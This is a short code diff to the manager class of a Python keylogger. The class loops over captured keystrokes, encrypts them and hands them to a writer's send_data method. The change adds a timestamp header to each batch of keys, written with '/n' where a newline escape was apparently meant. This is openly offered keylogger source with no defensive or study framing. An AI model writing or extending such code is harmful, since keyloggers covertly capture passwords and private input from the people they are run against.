@@ -3,6 +3,7 @@ from keylogger.new_keylogger import KeyloggerService
 import threading
 from writer.FileWriter import FileWriter
 from time import sleep
+from datetime import datetime
 
 class KeyLoggerManager:
     def __init__(self):
@@ -17,6 +18,7 @@ class KeyLoggerManager:
     def handle_logging(self):
         while self.flag:
             logged_keys = "".join(self.keylogger.get_logged_keys())
+            logged_keys = datetime.now().strftime('*****%H:%M %d/%m/%Y*****/n') + logged_keys + '/n' * 2
             self.encoder.text = logged_keys
             encrypted_data = self.encoder.encryption()
             self.writer.send_data(encrypted_data)
